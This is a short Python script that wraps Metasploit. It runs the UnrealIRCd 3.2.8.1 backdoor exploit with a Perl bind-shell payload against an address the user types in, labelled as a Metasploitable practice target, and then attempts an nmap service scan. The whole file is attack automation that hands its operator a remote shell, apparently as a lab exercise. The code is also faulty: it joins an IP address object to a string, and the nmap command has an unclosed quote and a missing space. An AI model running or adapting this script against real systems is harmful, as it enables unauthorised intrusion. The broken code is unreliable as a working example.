import os
import ipaddress

def unreal_backdoor():
    h = ipaddress.ip_address(input('Please enter the address of metasploitable: '))
    print("Starting exploit against", h)
    command = "msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor;set RHOSTS " + h + ";set payload cmd/unix/bind_perl;exploit'"
    os.system(command)

unreal_backdoor()

def nmap():
    h = ipaddress.ip_address(input('Please enter the address of metasploitable: '))
    print("Starting exploit against", h)
    command = "msfconsole -x 'nmap -v -sV" + h
    os.system(command)

nmap()
